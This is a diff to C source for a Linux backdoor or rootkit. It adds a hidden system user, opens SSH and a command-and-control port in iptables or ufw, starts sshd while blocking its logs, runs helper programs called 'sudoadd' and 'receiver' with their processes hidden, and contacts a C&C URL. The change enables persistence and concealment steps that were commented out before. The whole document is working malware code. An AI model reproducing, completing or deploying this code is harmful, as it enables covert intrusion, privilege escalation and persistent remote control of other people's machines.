@@ -18,8 +18,11 @@
 
 
 #define BUFFER_SIZE 512
-#define URL_SIZE 1024
+#define DATA_SIZE 1024
 #define COMMAND_SIZE 256
+
+#define SSH_PORT 22
+#define CC_PORT 8080
 
 const char *sbin_path = "/usr/sbin/";
 const char *username = "ebpfhelper";
@@ -35,11 +38,20 @@ const char *programs[] = {
     NULL
 };
 
-pid_t run_task_and_hide(const char *cmd) {
+// Cheers GPT ;3
+pid_t run_task_and_hide(const char *cmd, ...) {
+    char *args[100];
+    va_list ap;
+    int i = 0;
+
+    va_start(ap, cmd);
+    while ((args[i++] = va_arg(ap, char *)) != NULL);
+    va_end(ap);
+
     pid_t pid = fork();
     if (pid == 0) { // Child process for running the task
-        execl(cmd, cmd, NULL);
-        perror("execl"); // Executed only if execl fails
+        execv(cmd, args);
+        perror("execv"); // Executed only if execv fails
         exit(1);
     } else if (pid > 0) { // Parent process
         pid_t hide_pid = fork();
@@ -59,7 +71,6 @@ pid_t run_task_and_hide(const char *cmd) {
     }
     return pid;
 }
-
 
 // Function to be applied to each file in the directory
 static int remove_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
@@ -161,7 +172,7 @@ void combine_and_hide_pids(const char *names[], int num_names) {
 }
 
 void download_file(const char *local_path, const char *url) {
-    char cmd[URL_SIZE];
+    char cmd[DATA_SIZE];
     if (system("which curl") == 0) {
         snprintf(cmd, sizeof(cmd), "curl -o %s %s", local_path, url);
     } else if (system("which wget") == 0) {
@@ -231,30 +242,54 @@ void block_sshd_log() {
     free(found_pids);
 }
 
-void allow_firewall() {
+int update_iptables(int ports[], size_t size) {
+    for (size_t i = 0; i < size; ++i) {
+        char cmd[256];
+        snprintf(cmd, sizeof(cmd), "iptables -A INPUT -p tcp --dport %d -j ACCEPT", ports[i]);
+        if (system(cmd) != 0) {
+            fprintf(stderr, "Failed to update iptables rules for port %d.\n", ports[i]);
+            return 1;
+        }
+    }
+    if (system("iptables-save > /etc/iptables/rules.v4") != 0) {
+        fprintf(stderr, "Failed to save iptables rules.\n");
+        return 1;
+    }
+    return 0;
+}
+
+int update_ufw(int ports[], size_t size) {
+    for (size_t i = 0; i < size; ++i) {
+        char cmd[256];
+        snprintf(cmd, sizeof(cmd), "ufw allow %d/tcp", ports[i]);
+        if (system(cmd) != 0) {
+            fprintf(stderr, "Failed to update ufw rules for port %d.\n", ports[i]);
+            return 1;
+        }
+    }
+    return 0;
+}
+
+int allow_firewall() {
+    int ret = 0;
+    int ports[] = {SSH_PORT, CC_PORT};
+    size_t size = sizeof(ports) / sizeof(ports[0]);
+
     if (system("which iptables > /dev/null 2>&1") == 0) {
-        // If iptables is available
-        system("iptables -A INPUT -p tcp --dport 22 -j ACCEPT");
-        system("iptables-save > /etc/iptables/rules.v4");
+        ret = update_iptables(ports, size);
     } else if (system("which ufw > /dev/null 2>&1") == 0) {
-        // If ufw is available
         if (system("ufw status | grep -q 'Status: active'") == 0) {
-            // If ufw is active
-            // Enable sshd port
-            system("ufw allow 22/tcp");
-            // C&C port
-            system("ufw allow 8080/tcp");
+            ret = update_ufw(ports, size);
         } else {
             fprintf(stderr, "ufw is not active on this system.\n");
-            // Do nothing
-            //exit(1);
+            ret = 1;
         }
     } else {
-        // Neither iptables nor ufw is available
         fprintf(stderr, "Neither iptables nor ufw is available on this system.\n");
-        // Do nothing
-        //exit(1);
+        ret = 1;
     }
+
+    return ret;
 }
 
 void add_system_user(const char *username) {
@@ -356,7 +391,6 @@ void gather_system_info(char *data, size_t max_size) {
 
 void handle_sigint(int sig) {
     printf("\nPerforming shutdown task before exiting... \n");
-    remove("/tmp/btrfs.lock");  // Remove the lock file
 
     char *program_names[] = {"sudoadd", "pidhide", "writeblock"};
     int num_programs = sizeof(program_names) / sizeof(program_names[0]);
@@ -365,20 +399,22 @@ void handle_sigint(int sig) {
         int *found_pids = NULL;
         find_pid_by_name(program_names[i], &found_pids);
 
-        printf("Program: %s\n", program_names[i]);
-        printf("PIDs: ");
+        // Only do when found_pids not NULL
+        if (found_pids) {
+            printf("Program: %s\n", program_names[i]);
+            printf("PIDs: ");
 
-        for (int j = 0; found_pids[j] != -1; ++j) {
-            printf("%d ", found_pids[j]);
-            if (kill(found_pids[j], SIGINT) == -1) {
-                perror("kill");
+            for (int j = 0; found_pids[j] != -1; ++j) {
+                printf("%d ", found_pids[j]);
+                if (kill(found_pids[j], SIGINT) == -1) {
+                    perror("kill");
+                }
             }
+            printf("\n");
+            free(found_pids);  // Free the memory
         }
-        printf("\n");
-        free(found_pids);  // Free the memory
     }
-
-
+    remove("/tmp/btrfs.lock");  // Remove the lock file
     printf("Shutdown complete. Goodbye. \n");
     exit(0);
 }
@@ -395,41 +431,42 @@ int main(int argc, char *argv[]) {
     signal(SIGINT, handle_sigint);
     //int found_pids[PID_STR_SIZE];
     //char cmd[COMMAND_SIZE];
-    char data[1024];
-
+    char data[DATA_SIZE];
 
     //char local_file_path[256];
     const char *url = "http://monchi.local:3000/cnc";
 
-//
-//    // Check if username exists, if not add it
-//    if (getpwnam(username) == NULL) {
-//        printf("Adding new user...\n");
-//        add_system_user(username);
-//    }
+    // Check if username exists, if not add it
+    if (getpwnam(username) == NULL) {
+        printf("Adding new user...\n");
+        add_system_user(username);
+    }
     // Enable ssh
-    //allow_firewall();
-    //start_sshd();
-    //block_sshd_log();
+    allow_firewall();
+    start_sshd();
+    block_sshd_log();
 
     // Loop through each program to check if it exists, if not download it
     //for (int i = 0; programs[i] != NULL; ++i) {
-    //    snprintf(local_file_path, sizeof(local_file_path), "%s/%s", sbin_path, programs[i]);
+    //    snprintf(sbin_path, sizeof(sbin_path), "%s/%s", sbin_path, programs[i]);
     //    if (access(local_file_path, F_OK) == -1) {
     //        snprintf(cmd, sizeof(cmd), "%s%s", base_url, programs[i]);
-    //        download_file(local_file_path, cmd);
+    //        download_file(sbin_path, cmd);
     //    }
     //}
 
-    const char *names[] = {argv[0], "sudo", "writeblocker", "sshd", "rsyslogd", "sudoadd"};
+    // Run sudoadd
+    run_task_and_hide("/usr/sbin/sudoadd", "sudoadd", "-u", username, NULL);
+
+    // Run recevier
+    run_task_and_hide("/usr/sbin/receiver", "receiver", NULL);
+
+    // Hide processes
+    const char *names[] = {argv[0], "sudo", "writeblocker", "sshd", "sudoadd"};
     combine_and_hide_pids(names, sizeof(names) / sizeof(names[0]));
 
     // Create the service make sure this program runs every boot after network connection established
     //create_and_enable_service();
-    
-
-    // Run recevier
-    run_task_and_hide("/usr/sbin/receiver");
 
     // Loop to run indefinitely
     while (1) {
